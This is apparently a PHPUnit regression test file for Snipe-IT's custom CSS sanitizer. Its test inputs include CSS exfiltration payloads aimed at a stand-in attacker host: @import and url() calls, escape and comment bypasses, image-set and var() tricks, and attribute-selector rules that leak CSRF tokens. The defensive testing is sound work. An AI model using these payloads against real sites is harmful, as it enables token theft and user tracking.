<?php

namespace Tests\Unit\Models;

use App\Models\Setting;
use Tests\TestCase;

class SettingCustomCssTest extends TestCase
{
    private function withCustomCss(string $css): string
    {
        $settings = Setting::getSettings();
        $settings->custom_css = $css;
        $settings->save();

        return $settings->show_custom_css();
    }

    public function test_plain_css_passes_through_unchanged(): void
    {
        $out = $this->withCustomCss('.nav > li { color: #ff0000; }');

        $this->assertStringContainsString('.nav > li', $out);
        $this->assertStringContainsString('#ff0000', $out);
    }

    public function test_double_quoted_selector_survives(): void
    {
        $out = $this->withCustomCss('input[name="_token"] { display: none; }');

        $this->assertStringContainsString('name="_token"', $out);
    }

    public function test_import_at_rule_is_stripped(): void
    {
        $out = $this->withCustomCss('@import url("https://attacker.example/exfil.css");');

        $this->assertStringNotContainsString('@import', $out);
        $this->assertStringNotContainsString('attacker.example', $out);
    }

    public function test_import_at_rule_stripped_case_insensitive(): void
    {
        $out = $this->withCustomCss('@IMPORT "https://attacker.example/exfil.css";');

        $this->assertStringNotContainsString('IMPORT', $out);
        $this->assertStringNotContainsString('attacker.example', $out);
    }

    public function test_external_url_is_stripped(): void
    {
        $out = $this->withCustomCss('body { background: url("https://attacker.example/track.png"); }');

        $this->assertStringNotContainsString('attacker.example', $out);
    }

    public function test_protocol_relative_url_is_stripped(): void
    {
        $out = $this->withCustomCss('body { background: url(//attacker.example/track.png); }');

        $this->assertStringNotContainsString('attacker.example', $out);
    }

    public function test_data_uri_is_stripped(): void
    {
        $out = $this->withCustomCss('body { background: url(data:image/png;base64,AAAA); }');

        $this->assertStringNotContainsString('data:', $out);
    }

    public function test_relative_url_is_preserved(): void
    {
        $out = $this->withCustomCss('.brand { background: url("/uploads/logo.png"); }');

        $this->assertStringContainsString('/uploads/logo.png', $out);
    }

    public function test_html_tags_are_stripped(): void
    {
        $out = $this->withCustomCss('body { color: red; }<script>alert(1)</script>');

        // Inner text ("alert(1)") survives strip_tags but is harmless inside
        // <style>, since the CSS parser skips unrecognized tokens. What
        // matters is that no HTML tag boundary reaches the layout.
        $this->assertStringNotContainsString('<script', $out);
        $this->assertStringNotContainsString('</script', $out);
        $this->assertStringNotContainsString('<', $out);
    }

    public function test_attribute_selector_csrf_exfil_payload_is_neutered(): void
    {
        $payload = 'input[name="_token"][value^="a"] { background: url("https://attacker.example/?t=a"); }';

        $out = $this->withCustomCss($payload);

        $this->assertStringNotContainsString('attacker.example', $out);
    }

    public function test_empty_custom_css_returns_empty_string(): void
    {
        $out = $this->withCustomCss('');

        $this->assertSame('', $out);
    }

    // The regex previously required at least one whitespace character
    // between @import and the following token. CSS tokenizes @import
    // followed by a string, url(), or ident as a valid at-rule with
    // no whitespace required, so the bare-quote form below reached
    // the browser untouched under the old pattern.
    public function test_import_at_rule_without_whitespace_is_stripped(): void
    {
        $out = $this->withCustomCss('@import"https://attacker.example/exfil.css";');

        $this->assertStringNotContainsString('@import', $out);
        $this->assertStringNotContainsString('attacker.example', $out);
    }

    // CSS strips comments during tokenization, so @import/*x*/"url"
    // is equivalent to @import "url". The previous \s+ pattern didn't
    // treat comment tokens as whitespace, so the payload survived.
    public function test_import_at_rule_with_comment_between_is_stripped(): void
    {
        $out = $this->withCustomCss('@import/*comment*/"https://attacker.example/exfil.css";');

        $this->assertStringNotContainsString('@import', $out);
        $this->assertStringNotContainsString('attacker.example', $out);
    }

    // url() values are subject to CSS escape decoding. `\2F` decodes
    // to `/`, so `\2F\2F attacker.example` becomes `//attacker.example`
    // at browser render time. The scheme regex previously ran against
    // the raw pre-decode literal and missed the bypass.
    public function test_backslash_hex_escaped_protocol_relative_url_is_stripped(): void
    {
        $out = $this->withCustomCss('body { background: url("\2F\2F attacker.example/track.png"); }');

        $this->assertStringNotContainsString('attacker.example', $out);
    }

    // Second CSS escape shape: `\X` where X is any non-hex char
    // produces X literally. `\/\/attacker.example` decodes to
    // `//attacker.example`. Same class of bypass, different escape form.
    public function test_backslash_char_escaped_protocol_relative_url_is_stripped(): void
    {
        $out = $this->withCustomCss('body { background: url("\/\/attacker.example/track.png"); }');

        $this->assertStringNotContainsString('attacker.example', $out);
    }

    // GHSA-gc22-r333-8q45 regression coverage. The reporter's PoC:
    // CSS lets you write hex escapes inside identifiers, so
    // `@\69 mport` (where `\69 ` is the hex escape for 0x69 = 'i')
    // parses as `@import` in a browser but did not match the
    // source-text regex looking for the literal `@import`. The fix
    // refuses any CSS containing a backslash outright, matching the
    // posture the url() guard was already using for its own escape
    // bypass class.
    public function test_import_at_rule_with_hex_escaped_ident_is_stripped(): void
    {
        $out = $this->withCustomCss('@\69 mport"https://attacker.example/exfil.css";');

        $this->assertStringNotContainsString('attacker.example', $out);
        $this->assertStringNotContainsString('mport', $out);
    }

    // Full six-digit hex escape variant of the same bypass class.
    // `\000069` also decodes to 'i'. Rejecting all backslashes covers
    // every hex escape length CSS accepts.
    public function test_import_at_rule_with_full_hex_escaped_ident_is_stripped(): void
    {
        $out = $this->withCustomCss('@\000069mport"https://attacker.example/exfil.css";');

        $this->assertStringNotContainsString('attacker.example', $out);
        $this->assertStringNotContainsString('mport', $out);
    }

    // CSS strips comments during tokenization at every position except
    // inside strings, so `@im/*c*/port` parses as `@import` even though
    // no version of the source-text regex could ever match that literal.
    // The fix strips comments before running the regex.
    public function test_import_at_rule_with_comment_inside_keyword_is_stripped(): void
    {
        $out = $this->withCustomCss('@im/*c*/port "https://attacker.example/exfil.css";');

        $this->assertStringNotContainsString('attacker.example', $out);
        $this->assertStringNotContainsString('@import', $out);
    }

    // Positive control: legitimate CSS with a comment should still
    // render (comments are stripped before sanitizing, but the
    // surrounding CSS survives).
    public function test_legitimate_css_with_comments_is_preserved(): void
    {
        $out = $this->withCustomCss("/* branding header */\nbody { color: #ff0000; }\n/* end */");

        $this->assertStringContainsString('body', $out);
        $this->assertStringContainsString('#ff0000', $out);
    }

    // Positive control: any CSS containing a backslash is rejected
    // wholesale, matching the docstring on the new guard. This is a
    // trade-off flagged in the fix comment: legitimate CSS with escape
    // sequences (rare in branding) is refused, and the operator sees
    // an empty output rather than partially-sanitized input.
    public function test_css_with_stray_backslash_is_rejected(): void
    {
        $out = $this->withCustomCss('body { content: "hi\\A world"; }');

        $this->assertSame('', $out);
    }

    // GHSA-v279-2q6w-g8j4 regression coverage. The old denylist
    // required `//` after the scheme (matching only `http://`,
    // `https://`, or `//`). `http:host:port/path` shapes carry a
    // scheme with no authority slashes, so they slipped past. A
    // browser still resolves this to a cross-origin fetch when the
    // page scheme differs from the URL scheme (an https page loading
    // `http:evil` becomes a cross-origin GET). Fix converts the check
    // to a scheme allowlist that rejects anything starting with a
    // URI scheme or `//`.
    public function test_scheme_only_url_without_authority_slashes_is_stripped(): void
    {
        $out = $this->withCustomCss('body { background: url(http:127.0.0.1:9931/bg); }');

        $this->assertStringNotContainsString('127.0.0.1', $out);
        $this->assertStringNotContainsString('9931', $out);
    }

    // Same class, https variant.
    public function test_scheme_only_https_url_without_authority_slashes_is_stripped(): void
    {
        $out = $this->withCustomCss('body { background: url(https:attacker.example:443/bg); }');

        $this->assertStringNotContainsString('attacker.example', $out);
    }

    // Other schemes the old denylist didn't enumerate. The allowlist
    // rejects every scheme uniformly, so `mailto:`, `ftp:`, `file:`,
    // and any future custom scheme (`chrome:`, `about:`, etc.) all
    // get rejected without needing explicit enumeration.
    public function test_arbitrary_scheme_urls_are_stripped(): void
    {
        foreach (['mailto:test@example.com', 'ftp://example.com/foo', 'file:///etc/passwd', 'chrome://settings'] as $scheme) {
            $out = $this->withCustomCss('body { background: url('.$scheme.'); }');
            $this->assertStringNotContainsString($scheme, $out, "Expected `{$scheme}` to be stripped from url() value.");
        }
    }

    // Positive control: legitimate same-origin relative URLs continue
    // to render. Branding assets uploaded through the settings UI
    // land under /uploads/, so the primary legitimate reference shape
    // is a root-relative path starting with a single `/`.
    public function test_root_relative_upload_path_is_preserved(): void
    {
        $out = $this->withCustomCss('body { background: url(/uploads/logos/branding.png); }');

        $this->assertStringContainsString('/uploads/logos/branding.png', $out);
    }

    // Positive control: relative paths (no leading slash) also pass,
    // for CSS that references sibling paths relative to its own base
    // URL. Same-origin by construction.
    public function test_relative_path_is_preserved(): void
    {
        $out = $this->withCustomCss('body { background: url(images/logo.png); }');

        $this->assertStringContainsString('images/logo.png', $out);
    }

    // Regression for the HusseinTahaSEC report (incomplete fix of
    // GHSA-v279-2q6w-g8j4). The url() allowlist tightening missed
    // the sibling CSS image-loading primitives image(), image-set(),
    // cross-fade(), and the -webkit- variants. All of them reach the
    // same external-resource fetch primitive the url() allowlist
    // exists to gate, so a superuser could plant
    // `input[name="_token"][value^="a"] { background-image: image-set("https://attacker/a"); }`
    // and exfiltrate CSRF tokens character-by-character via
    // attribute-selector rules. Fix strips every non-url()
    // image-loading function call entirely, since legitimate
    // custom-branding CSS uses url() for logos.
    public function test_image_set_function_is_stripped(): void
    {
        $out = $this->withCustomCss('body { background-image: image-set("https://attacker.example/a" 1x, "https://attacker.example/b" 2x); }');

        $this->assertStringNotContainsString('image-set', $out);
        $this->assertStringNotContainsString('attacker.example', $out);
    }

    public function test_image_function_is_stripped(): void
    {
        $out = $this->withCustomCss('body { background-image: image("https://attacker.example/exfil"); }');

        $this->assertStringNotContainsString('image(', $out);
        $this->assertStringNotContainsString('attacker.example', $out);
    }

    public function test_webkit_image_set_function_is_stripped(): void
    {
        // -webkit-image-set is the vendor-prefixed sibling of image-set
        // and reaches the same fetch primitive. Older Safari / Chrome
        // honor it. Must be stripped alongside the unprefixed form.
        $out = $this->withCustomCss('body { background: -webkit-image-set(url("https://attacker.example/a") 1x); }');

        $this->assertStringNotContainsString('-webkit-image-set', $out);
        $this->assertStringNotContainsString('attacker.example', $out);
    }

    public function test_cross_fade_function_is_stripped(): void
    {
        // cross-fade can take image() or image-set() as children, so
        // leaving it unstripped would let an attacker nest the real
        // fetch call inside a cross-fade wrapper and bypass stripping
        // of the inner. The outer-function strip handles the whole
        // function call via balanced-paren walking.
        $out = $this->withCustomCss('body { background-image: cross-fade(url("https://attacker.example/a") 50%, url("https://attacker.example/b") 50%); }');

        $this->assertStringNotContainsString('cross-fade', $out);
        $this->assertStringNotContainsString('attacker.example', $out);
    }

    public function test_attribute_selector_image_set_csrf_exfil_payload_is_neutered(): void
    {
        // Reporter's PoC verbatim. Simulated attribute-based token
        // exfil shape, demonstrates image-set() stripped before any
        // url inside gets a chance to run through the allowlist.
        $out = $this->withCustomCss(
            'input[name="_token"][value^="a"] { background-image: image-set("https://attacker.example/c?a"); }'
            .'input[name="_token"][value^="b"] { background-image: image-set("https://attacker.example/c?b"); }'
            .'* { background-image: image("https://attacker.example/ping"); }'
        );

        $this->assertStringNotContainsString('attacker.example', $out);
        $this->assertStringNotContainsString('image-set', $out);
        $this->assertStringNotContainsString('image(', $out);
    }

    public function test_var_indirection_through_custom_property_is_blocked(): void
    {
        /*
         * GHSA-gmvp-6qh3-5xm6: Reporter's PoC. `url()` scheme check sees
         * `var(--b)` which has no scheme literal, but the browser resolves
         * the variable at computed-value time and fetches the stashed URL.
         */
        $out = $this->withCustomCss(':root{--b:"https://attacker.example/p"}body{background:url(var(--b))}');

        $this->assertStringNotContainsString('attacker.example', $out);
        $this->assertStringNotContainsString('--b', $out);
        $this->assertStringNotContainsString('var(', $out);
    }

    public function test_custom_property_declaration_alone_is_blocked(): void
    {
        /*
         * A planter could override one of Snipe-IT's own :root variables
         * to redirect any builtin rule that reads it, so refuse the
         * declaration shape outright even without a visible url().
         */
        $out = $this->withCustomCss(':root { --primary-color: red; } .nav { color: black; }');

        $this->assertSame('', $out);
    }

    public function test_reading_an_existing_variable_still_works(): void
    {
        /*
         * Admin branding CSS legitimately reads existing Snipe-IT
         * variables (e.g. to recolor nav elements). The fix must not
         * break that use case.
         */
        $out = $this->withCustomCss('.nav > li { color: var(--primary-color); }');

        $this->assertStringContainsString('var(--primary-color)', $out);
    }

    public function test_var_inside_url_argument_is_rejected_defense_in_depth(): void
    {
        /*
         * Defense-in-depth check inside the url() callback. Exercise it
         * directly by feeding a CSS payload that uses var() only inside a
         * url() argument (no top-level --* declaration to trip the earlier
         * guard). The url() must emit empty while the surrounding rule
         * still carries through.
         */
        $out = $this->withCustomCss('body { background: url(var(--existing-color)); color: red; }');

        $this->assertStringNotContainsString('var(', $out);
        $this->assertStringContainsString('color: red', $out);
    }

    public function test_balanced_paren_walker_handles_nested_url_inside_image_set(): void
    {
        // image-set can wrap url() calls as children. The stripper
        // must not stop at the inner close-paren of the nested url(),
        // which a naive non-balanced regex would do. Balanced-paren
        // walking in stripImageLoadingFunctions handles this.
        $out = $this->withCustomCss('body { background: image-set(url("https://attacker.example/a") 1x, url("https://attacker.example/b") 2x); color: red; }');

        $this->assertStringNotContainsString('attacker.example', $out);
        $this->assertStringNotContainsString('image-set', $out);
        // Non-stripped CSS after the function should still be present
        // and well-formed.
        $this->assertStringContainsString('color: red', $out);
    }
}
